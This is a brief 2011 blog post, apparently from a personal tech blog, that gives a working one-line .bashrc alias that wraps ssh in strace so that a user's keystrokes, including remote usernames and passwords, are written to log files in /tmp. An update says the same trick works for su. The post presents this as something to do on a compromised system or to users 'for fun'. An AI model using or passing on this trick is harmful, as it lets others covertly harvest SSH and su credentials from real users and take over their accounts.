---
title: "Poor man's SSH keylogger"
description: "If you have compromised a system (while doing penetration testing, obviously), or if you are just a BOFH that wishes to have a little fun, you can do something as easy as this."
date: "2011-02-03"
published: "2011-02-03T13:53:00.000-08:00"
slug: "poor-mans-ssh-keylogger"
tags: ["ssh", "keylogger"]
deadImages: []
---

If you have compromised a system (while doing penetration testing, obviously), or if you are just a BOFH that wishes to have a little fun, you can do something as easy as this:

Edit the users ~/.bashrc and insert the following alias:

```bash
ssh='strace   -o   /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 ssh' 
```

Now, every time a user uses the ssh command, he will be using this alias, and all his keystrokes (including the remote system's username/password), will be logged to /tmp.

![](/images/ext/a71900716d-tumblr_lg1sdtJp921qevk7j.png)

As I said, this is nothing fancy, and a quick look at the env, at the .bashrc or even at /tmp is enough to spot this. However, for a quick simple solution, it is more than enough.

Update: as one of the readers pointed out, this also works with su, using the exact same trick.
